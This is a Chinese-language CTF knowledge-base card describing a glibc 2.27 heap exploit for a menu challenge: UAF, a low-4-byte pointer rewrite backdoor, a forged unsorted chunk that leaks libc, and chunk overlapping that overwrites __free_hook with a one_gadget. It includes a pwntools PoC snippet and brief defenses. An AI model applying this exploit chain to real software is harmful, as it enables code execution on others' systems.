---
id: ctf-pwn-uaf-low4byte-next-fake-unsorted-overlap-freehook
title: 菜单堆题 UAF + 后门只改 next 低 4 字节：伪造 unsorted chunk 泄 libc → overlapping 打 __free_hook
type: scenario
domain: ctf
path: ctf/pwn
technique: uaf-low4byte-next-fake-unsorted-overlap-freehook
tags:
- pwn
- heap
- uaf
- unsorted-bin
- libc-leak
- overlapping
- tcache
- free-hook
- one-gadget
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T1-3
  verified_at: '2026-11-07T21:35:37+08:00'
  notes: 已对照原文核对；图 01-05 add/remove_gift/show/bargain 伪代码(size 0xF0/0x50、free 不置空 UAF、后门只改低 4 字节一次)、图 06-08 伪造 0x451 chunk 与 tcachebins[0x110]、图 09/22/23 flag、content.md 完整 exp 与卡一致；dedup 除草稿自身 exact duplicate 外 top 候选 ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system 为 related(0.9195)，其 conclusion 是释放真实 0x430 大块泄 libc + tcache 投毒 __free_hook 写 system，本卡是伪造 0x450 chunk + 一次性低 4 字节 next 改写 + overlapping 改 next 到 free_hook-0x10 + one_gadget，触发条件与 PoC 明显不同，非同一条利用链，--force/append_scenario 理由成立；与技巧卡为并列(通用技巧 vs 具体题解)，dup-scan 无涉及本篇 pair。未验证点：绑定 glibc 2.27 与该题布局、one_gadget 偏移未逐一验证，原文仅显示调试环境 libc-2.27.so 属目标环境版本，未设置 affected_versions、cve 为空；路径 ctf/pwn 合法，frontmatter 无违规 sources/source。
url: /docs/ctf/pwn/ctf-pwn-uaf-low4byte-next-fake-unsorted-overlap-freehook/
draft: false
kb_aliases:
- UAF 伪造 unsorted chunk
- 低 4 字节指针改写
- overlapping 改 next
- free_hook one_gadget
- 伪造 chunk 泄漏 libc
---

## 一句话结论

一类菜单堆题给出 add/free/show 加一个「只能用一次、只能改 4 字节」的后门：free 存在 UAF、add 只能申请两种固定大小且次数有限、无法填满 tcache。解法是利用堆溢出在堆上伪造一个 0x450 大小的 chunk，用后门把某结构体的 `next` 指针低 4 字节改到伪造 chunk，add 申请到它并 free 进 unsorted bin 泄漏 libc；再释放两个 0x110 chunk 后申请 0x70 造成 overlapping，改写 `next` 指向 `__free_hook-0x10`，申请到该处写入 one_gadget，最后 free 触发 getshell。

## 原理

- **漏洞组合**：`remove_gift` 直接 `free(gift_list[index])` 不置空（UAF，可配合 show 读已释放块）；`add` 用 `malloc(0x100)`/`malloc(0x60)`，`read(0, &v2->talk, v2->size)` 中 `size` 字段被写成 `0xF0`/`0x50` 与实际堆块不匹配，形成可越界写堆数据的能力；`show` 用 `%ld` 打印 `cost` 与 `%s` 打印 `talk`，可读出 fd/bk。
- **后门 bargain**：`chance` 只允许用一次、`v2 = read_num()` 是 4 字节整数且 `v2 > 16` 会退出，执行 `gift_list[num]->cost -= v2`。由于结构体 `cost` 与后续 `next` 指针在内存中相邻，减去一个受控的 32 位偏移量即可把 `next` 的低 4 字节改到堆上其它位置（堆内偏移固定，只需低 4 字节即可命中）。
- **伪造 chunk 泄 libc**：在可控堆区布置 `p64(0x451)` 等字段伪造一个 unsorted bin 范围 chunk，并处理好与 top chunk/相邻 chunk 的 `PREV_INUSE`（见「伪造 unsorted bin chunk 绕过 free 合并检查」场景）；用后门把 `next` 指过去，之后 add 返回该伪造 chunk，`free` 后其 fd/bk 指向 `main_arena+0x60` 附近，show 读出即可算 `libc_base = leak - (main_arena_offset + 0x60)`。
- **overlapping 改 next**：再 free 两个 0x110 chunk（tcache 中形成链表），随后申请 0x70 大小的 chunk；tcache 无合适块会从刚释放的 unsorted bin 中切割，造成与仍在使用的结构体**重叠**，于是新块的内容可覆盖旧结构体的 `next` 指针，把它写成 `__free_hook-0x10`。
- **任意地址申请**：再 add 时 `next` 已被指向 `__free_hook-0x10`，分配到该处后写入 `one_gadget`（libc 2.27 常用偏移），最后 free 一个块触发 `__free_hook` 拿到 shell。

## 触发条件

- glibc 2.x（文中 2.27，one_gadget 与 `__free_hook` 可用）；菜单堆题存在 UAF + 可越界写堆 + 一次性 4 字节指针改写后门。
- add 次数有限、只能申请少数固定大小，无法用常规「填满 tcache」方案。
- 堆布局偏移可预测（未随机化到不可控），能布置伪造 chunk 与衔接 top chunk 的 size/prev_inuse。
- 已有 libc 版本对应的 one_gadget 偏移与 `main_arena` 偏移。

## 利用步骤

1. 分析 add/free/show/后门：确认 UAF、`size` 字段与读入长度、后门只改低 4 字节且仅一次。
2. 用 add 的越界写在堆上布置伪造 0x451 chunk 及「衔接 top chunk」的 size/prev_inuse 数据。
3. free 两个 chunk，调用后门把 `next` 低 4 字节减去固定偏移（如 `-0xc0`）指向伪造 chunk。
4. 连续 add 拿到伪造 chunk，`free` 后进 unsorted bin，show 读 `cost` 解析出 `main_arena` 地址算 `libc_base`、`system`、`__free_hook`、one_gadget。
5. free 两个 0x110 chunk，add 一个 0x70 chunk 从 unsorted bin 切割造成 overlapping，写入 `p64(0)*7 + p64(0x111) + p64(free_hook-0x10)` 覆盖 `next`。
6. add 申请到 `__free_hook-0x10`，写入 one_gadget；再 free 一个块触发 getshell，`cat flag`。

## PoC（最小化，pwntools 片段）

```python
# 1) 布置伪造 chunk 与衔接数据
add(1, p64(0)*21 + p64(0x451) + p64(0) + p64(0xf0))          # #0
add(1, b"F"*4); add(1, b"F"*4); add(1, b"F"*4)                # #1 #2 #3
add(1, p64(0)*12 + p64(0)*11 + p64(0x41))                     # #4 衔接 top chunk

# 2) UAF + 后门把 next 低 4 字节改到伪造 chunk
free(0); free(1)
send_backdoor(np.uint32(-0xc0))

# 3) 申请伪造 chunk 并释放进 unsorted bin 泄 libc
add(1, b"G"*7)   # #5
add(1, b"J"*7)   # #6  -> 伪造 chunk
free(6); show(6)
libc_base = leak - (libc.sym["__malloc_hook"] + 0x10 + 0x60)
free_hook = libc_base + libc.sym["__free_hook"]

# 4) overlapping 改 next 到 free_hook-0x10，写 one_gadget
free(2); free(1)
add(2, p64(0)*7 + p64(0x111) + p64(free_hook - 0x10))
add(1, b"a"*4)                                                # 占位
add(1, p64(libc_base + ONE_GADGET))
free(8)
p.sendline(b"cat flag")
```

原文给出完整 exp（含 `success()` 打印与 `p.interactive()`），并在 pwndbg 下展示 tcachebins[0x110]、伪造 chunk 进入 `unsortedbin[all][0]` 与最终 flag；PoC 为最小示意。

## 变体与关联

- 与 `ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system`（菜单堆题 UAF + 堆溢出：unsortedbin 泄 libc 后 tcache 投毒 `__free_hook`）同属「UAF 泄 libc → 打 hook」链，但本链用「一次性 4 字节 next 改写 + 伪造 unsorted chunk + overlapping」绕开 add 次数/尺寸限制，不是直接 tcache poisoning。
- 伪造 chunk 与 top chunk 衔接/绕过 free 合并检查见 `binary-pwn-heap-fake-unsorted-chunk-prev-inuse-merge-bypass`；本文是该技巧在题目中的前置应用。
- 变体：改打 `__malloc_hook` + realloc 调栈、用 `system("/bin/sh")` 替代 one_gadget、高版本 glibc 改打 `_IO_list_all`/FSOP 或 tcache key 绕过。

## 检测与防御

- CTF/教学场景；防御侧同堆利用通用措施：消除 UAF（free 后置空）、读入长度与结构体/堆块大小一致、限制后门式任意指针改写、开启 glibc 高版本检查。
- 检测特征：`free+997` 的 `corrupted size vs. prev_size`、unsorted bin 中出现手工伪造的 0x450 chunk、`__free_hook` 被写入非 system 的函数地址、一次性写 4 字节指针的异常减法操作。
